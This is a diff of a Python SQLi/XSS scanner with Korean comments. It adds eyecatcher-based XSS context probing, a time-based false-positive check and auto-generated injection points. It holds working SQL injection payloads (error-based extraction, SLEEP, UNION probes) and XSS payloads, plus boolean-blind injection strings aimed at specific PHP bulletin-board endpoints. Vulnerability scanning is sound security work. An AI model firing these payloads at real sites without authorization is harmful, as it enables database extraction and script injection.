@@ -1,6 +1,6 @@
 """
-SQLi / XSS Scanner v3 - payloads_v2.json 기반
-: TRUE/FALSE control baseline + XSS 반영 탐지 통합
+SQLi / XSS Scanner v4 - ZAP 방식 개선 적용
+: Eyecatcher 컨텍스트 탐지 + Time-based double-check + Boolean 탐지 통합
 
 Usage:
     python scanner.py
@@ -63,6 +63,40 @@ XSS_MARKERS = [
     "<svg onload",
     "<details open ontoggle",
 ]
+
+# ── Eyecatcher (ZAP 방식) ──────────────────────────────────────────
+# 무해한 마커를 먼저 전송해서 반사 위치(컨텍스트) 파악
+EYECATCHER = "zap7f3a9bmarker"
+
+# ── targets.json 자동 로드용 기본 페이로드 ─────────────────────────
+# crawler.py → analyzer.py → targets.json 연동 시 사용
+GENERIC_SQLI_PAYLOADS = [
+    {"type": "SQLI_STRING", "family": "quote_error",     "payload": "'1'='1"},
+    {"type": "SQLI_STRING", "family": "quote_tautology", "payload": "' OR '1'='1"},
+    {"type": "SQLI_STRING", "family": "error_extract",   "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
+    {"type": "SQLI_STRING", "family": "error_update",    "payload": "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -"},
+    {"type": "SQLI_STRING", "family": "time_sleep",      "payload": "' AND SLEEP(5)-- -"},
+    {"type": "SQLI_STRING", "family": "union_probe",     "payload": "' UNION SELECT NULL,NULL,NULL-- -"},
+]
+
+GENERIC_XSS_PAYLOADS = [
+    {"type": "REFLECTED_XSS", "family": "script_basic",   "payload": "<script>alert(1)</script>"},
+    {"type": "REFLECTED_XSS", "family": "img_onerror",    "payload": "<img src=x onerror=alert(1)>"},
+    {"type": "REFLECTED_XSS", "family": "value_breakout", "payload": "\"><img src=x onerror=alert(1)>"},
+    {"type": "REFLECTED_XSS", "family": "onmouseover",    "payload": "\" onmouseover=alert(1) x=\""},
+    {"type": "REFLECTED_XSS", "family": "details_toggle", "payload": "<details open ontoggle=alert(1)>"},
+]
+
+# 컨텍스트별 우선 시도 페이로드 힌트 (참고용 로그)
+XSS_CONTEXT_HINT = {
+    "attr_value":  '→ " onmouseover=alert(1) x=" 계열 우선',
+    "attr_href":   '→ javascript:alert(1) 계열 우선',
+    "script":      '→ ";alert(1);// 계열 우선',
+    "body":        '→ <img src=x onerror=alert(1)> 계열 우선',
+    "html_comment":'→ --> <script>alert(1)</script> <!-- 계열 우선',
+    "none":        '→ 반사 없음 (필터링됨)',
+    "unknown":     '→ 컨텍스트 불명확',
+}
 
 # ── 포인트별 설정 ─────────────────────────────────────────────────
 
@@ -395,6 +429,70 @@ POINT_CONFIG = {
         "ctrl_false": "",
         "ctrl_extra": {},
     },
+
+    # ══ ZAP 발견: password.php — sod Boolean Blind SQLi ══════════
+    # ZAP 탐지 payload: desc" AND "1"="1" --  vs  desc" AND "1"="2" --
+    "sqli_password_sod": {
+        "url":    f"{TARGET_BASE}/bbs/password.php",
+        "method": "GET",
+        "param":  "sod",
+        "mode":   "sqli",
+        "inject_extra": {
+            "bo_table": "test", "page": "1",
+            "sop": "and", "sst": "wr_hit", "w": "u", "wr_id": "3",
+        },
+        # TRUE(1=1) vs FALSE(1=2) → 응답 크기 차이로 Boolean Blind 탐지
+        "ctrl_true":  'desc" AND "1"="1" -- ',
+        "ctrl_false": 'desc" AND "1"="2" -- ',
+        "ctrl_extra": {
+            "bo_table": "test", "page": "1",
+            "sop": "and", "sst": "wr_hit", "w": "u", "wr_id": "3",
+        },
+    },
+
+    # ══ ZAP 발견: password.php — sop Boolean Blind SQLi ══════════
+    "sqli_password_sop": {
+        "url":    f"{TARGET_BASE}/bbs/password.php",
+        "method": "GET",
+        "param":  "sop",
+        "mode":   "sqli",
+        "inject_extra": {
+            "bo_table": "test", "page": "1",
+            "sod": "desc", "sst": "wr_hit", "w": "u", "wr_id": "3",
+        },
+        "ctrl_true":  'and" AND "1"="1" -- ',
+        "ctrl_false": 'and" AND "1"="2" -- ',
+        "ctrl_extra": {
+            "bo_table": "test", "page": "1",
+            "sod": "desc", "sst": "wr_hit", "w": "u", "wr_id": "3",
+        },
+    },
+
+    # ══ ZAP 발견: board.php — wr_id Boolean Blind SQLi ══════════
+    # ZAP 탐지: wr_id=1" AND "1"="1" --  vs  OR "1"="1" --
+    "sqli_board_wr_id": {
+        "url":    f"{TARGET_BASE}/bbs/board.php",
+        "method": "GET",
+        "param":  "wr_id",
+        "mode":   "sqli",
+        "inject_extra": {"bo_table": "gallery"},
+        "ctrl_true":  '1" AND "1"="1" -- ',
+        "ctrl_false": '1" AND "1"="2" -- ',
+        "ctrl_extra": {"bo_table": "gallery"},
+    },
+
+    # ══ ZAP 발견: qalist.php — Boolean Blind SQLi (URL 파라미터) ═
+    "sqli_qalist_blind": {
+        "url":    f"{TARGET_BASE}/bbs/qalist.php",
+        "method": "GET",
+        "param":  "stx",
+        "mode":   "sqli",
+        "inject_extra": {"sfl": "wr_subject"},
+        # ZAP: ' AND '1'='1' --  vs  ' AND '1'='2' --
+        "ctrl_true":  "test' AND '1'='1' -- ",
+        "ctrl_false": "test' AND '1'='2' -- ",
+        "ctrl_extra": {"sfl": "wr_subject"},
+    },
 }
 
 
@@ -456,12 +554,67 @@ def has_xss_marker(text: str) -> Tuple[bool, str]:
     return False, ""
 
 
+def probe_xss_context(session, config: dict, timeout: int) -> str:
+    """
+    ZAP Eyecatcher 방식: 무해한 마커 전송 → 반사 위치(컨텍스트) 파악
+    반환값: 'attr_value' | 'attr_href' | 'script' | 'body' | 'html_comment' | 'none' | 'unknown'
+    """
+    resp = send(session, config, EYECATCHER, config.get("inject_extra", {}), timeout)
+    if not resp or not resp["text"]:
+        return "unknown"
+
+    text = resp["text"]
+    idx  = text.find(EYECATCHER)
+    if idx == -1:
+        return "none"   # 마커가 응답에 없음 → 반사 안 됨 or 인코딩됨
+
+    # 마커 앞 50자, 뒤 50자 컨텍스트 확인
+    before = text[max(0, idx - 50): idx]
+    after  = text[idx + len(EYECATCHER): idx + len(EYECATCHER) + 50]
+
+    before_l = before.lower()
+
+    # HTML 주석 내부
+    if "<!--" in before and "-->" not in before:
+        return "html_comment"
+
+    # <script> 태그 내부
+    if "<script" in before_l:
+        # 아직 </script>가 안 나왔으면 script 컨텍스트
+        script_open  = before_l.rfind("<script")
+        script_close = before_l.rfind("</script")
+        if script_open > script_close:
+            return "script"
+
+    # value="" 속성 내부
+    if 'value="' in before or "value='" in before:
+        return "attr_value"
+
+    # href / src / action 속성 내부
+    for attr in ['href="', "href='", 'src="', "src='", 'action="', "action='"]:
+        if attr in before:
+            return "attr_href"
+
+    # 일반 태그 속성 내부 (따옴표로 감싸진 경우)
+    last_dq = before.rfind('"')
+    last_sq = before.rfind("'")
+    last_gt = before.rfind(">")
+    if max(last_dq, last_sq) > last_gt:
+        return "attr_value"
+
+    # HTML body 직접 반사
+    return "body"
+
+
 # ── 제어 기준 측정 ─────────────────────────────────────────────────
 
 def measure_controls(session, config: dict,
                      timeout: int) -> Tuple[Optional[dict], Optional[dict], bool]:
     if config["mode"] == "xss":
-        # XSS 모드: control 측정 불필요
+        # XSS 모드: eyecatcher로 반사 컨텍스트 먼저 파악
+        ctx = probe_xss_context(session, config, timeout)
+        hint = XSS_CONTEXT_HINT.get(ctx, "")
+        print(f"  [EYECATCHER] 반사 컨텍스트: {ctx.upper()}  {hint}")
         return None, None, False
 
     print(f"  [CTRL] TRUE  : {config['ctrl_true'][:60]}")
@@ -575,6 +728,11 @@ def scan_point(session, point_name: str, payloads: dict,
     ctrl_true, ctrl_false, boolean_possible = measure_controls(
         session, config, timeout)
 
+    # XSS eyecatcher 컨텍스트 결과 저장 (scan_point 레벨)
+    xss_context = "n/a"
+    if mode == "xss":
+        xss_context = probe_xss_context(session, config, timeout)
+
     total_vuln   = 0
     total_tested = 0
 
@@ -597,6 +755,25 @@ def scan_point(session, point_name: str, payloads: dict,
                 vulnerable, reason = detect(
                     rec, resp, ctrl_true, ctrl_false,
                     boolean_possible, mode)
+
+            # ── ZAP double-check: Time-based 오탐 방지 ────────────
+            # Time delay 탐지 시 일반 요청으로 서버 상태 한번 더 확인
+            if vulnerable and "time_delay" in reason:
+                print(f"\n    [DOUBLE-CHECK] 지연 탐지 → 서버 상태 재확인 중...")
+                chk = send(session, config,
+                           config.get("ctrl_false", "test"),
+                           config.get("ctrl_extra", {}), timeout)
+                if chk and chk["elapsed"] >= SLEEP_THRESHOLD * 0.8:
+                    # 일반 요청도 느리면 서버 과부하로 판단 → 스킵
+                    vulnerable = False
+                    reason = (f"time_doublecheck_fail: "
+                              f"server_slow ({chk['elapsed']:.2f}s), "
+                              f"not SQLi")
+                    print(f"    [DOUBLE-CHECK] 서버 과부하 판단 → 스킵 ({chk['elapsed']:.2f}s)")
+                else:
+                    chk_t = chk["elapsed"] if chk else 0
+                    print(f"    [DOUBLE-CHECK] 확인 완료 ✓ "
+                          f"(정상 요청={chk_t:.2f}s → SQLi 확정)")
 
             if vulnerable:
                 total_vuln += 1
@@ -627,6 +804,7 @@ def scan_point(session, point_name: str, payloads: dict,
                     "length":  resp["length"]  if resp else None,
                     "elapsed": round(resp["elapsed"], 3) if resp else None,
                 } if resp else None,
+                "xss_context": xss_context if mode == "xss" else None,
                 "controls": {
                     "true_len":  ctrl_true["length"]  if ctrl_true  else None,
                     "false_len": ctrl_false["length"] if ctrl_false else None,
@@ -639,6 +817,70 @@ def scan_point(session, point_name: str, payloads: dict,
 
     print(f"\n  [SUMMARY] {point_name}: {total_vuln}/{total_tested} 탐지")
     return results
+
+
+# ── targets.json 자동 변환 ────────────────────────────────────────
+
+def build_points_from_targets(targets: List[dict]) -> Tuple[dict, dict]:
+    """
+    analyzer.py 출력(targets.json) → POINT_CONFIG 항목 + 페이로드 자동 생성
+
+    반환값: (new_points, new_payloads)
+      - new_points  : POINT_CONFIG에 merge할 딕셔너리
+      - new_payloads: all_payloads에 merge할 딕셔너리
+    """
+    new_points: dict = {}
+    new_payloads: dict = {}
+
+    for t in targets:
+        url    = t["action"]
+        method = t["method"].upper()
+        all_params = t["params"]
+        injectable = [p for p in all_params if p.get("injectable")]
+
+        for inj in injectable:
+            param_name = inj["name"]
+
+            # 같은 폼/URL의 나머지 파라미터 → inject_extra (기본값 유지)
+            extra = {
+                p["name"]: p.get("default_value", "")
+                for p in all_params
+                if p["name"] != param_name
+            }
+            ctrl_true  = inj.get("default_value") or "test"
+            ctrl_false = "xzxzxz_nomatch_xyz999"
+            base_key   = f"auto_{t['id']}_{param_name}"
+
+            # SQLi 포인트
+            sqli_key = f"{base_key}_sqli"
+            new_points[sqli_key] = {
+                "url":          url,
+                "method":       method,
+                "param":        param_name,
+                "mode":         "sqli",
+                "inject_extra": extra,
+                "ctrl_true":    ctrl_true,
+                "ctrl_false":   ctrl_false,
+                "ctrl_extra":   extra,
+            }
+            new_payloads[sqli_key] = {"sqli_string": GENERIC_SQLI_PAYLOADS}
+
+            # XSS 포인트 (GET만 — POST XSS는 Stored라 수동 확인 필요)
+            if method == "GET":
+                xss_key = f"{base_key}_xss"
+                new_points[xss_key] = {
+                    "url":          url,
+                    "method":       method,
+                    "param":        param_name,
+                    "mode":         "xss",
+                    "inject_extra": extra,
+                    "ctrl_true":    ctrl_true,
+                    "ctrl_false":   ctrl_false,
+                    "ctrl_extra":   extra,
+                }
+                new_payloads[xss_key] = {"xss_search": GENERIC_XSS_PAYLOADS}
+
+    return new_points, new_payloads
 
 
 # ── Main ──────────────────────────────────────────────────────────
@@ -655,6 +897,8 @@ def main():
     parser.add_argument("--verbose",  action="store_true")
     parser.add_argument("--point",    default=None,
                         help="특정 포인트만 (예: sqli_search_sfl)")
+    parser.add_argument("--targets",  default=None,
+                        help="targets.json 경로 (crawler.py → analyzer.py 출력)")
     args = parser.parse_args()
 
     SLEEP_THRESHOLD = args.sleep_threshold
@@ -665,6 +909,20 @@ def main():
     except FileNotFoundError:
         print(f"[ERROR] {args.payloads} 없음. generate_payloads.py 먼저 실행.")
         sys.exit(1)
+
+    # targets.json 자동 로드 (crawler.py → analyzer.py 연동)
+    if args.targets:
+        try:
+            with open(args.targets, encoding="utf-8") as f:
+                targets_data = json.load(f)
+            auto_points, auto_payloads = build_points_from_targets(targets_data)
+            POINT_CONFIG.update(auto_points)
+            all_payloads.update(auto_payloads)
+            print(f"  [TARGETS] {args.targets} 로드 완료")
+            print(f"            자동 생성 포인트: {len(auto_points)}개")
+        except FileNotFoundError:
+            print(f"[ERROR] {args.targets} 없음.")
+            sys.exit(1)
 
     print(f"\n{'='*60}")
     print(f"  SQLi/XSS Scanner v3")
@@ -709,6 +967,11 @@ def main():
         "sqli_profile_mb":        "sqli_profile_mb",
         "xss_register_name":      "xss_register_name",
         "open_redirect_login":    "open_redirect_login",
+        # ZAP 발견 — Boolean Blind SQLi 추가
+        "sqli_password_sod":      "sqli_password_sod",
+        "sqli_password_sop":      "sqli_password_sop",
+        "sqli_board_wr_id":       "sqli_board_wr_id",
+        "sqli_qalist_blind":      "sqli_qalist_blind",
     }
 
     session  = make_session()
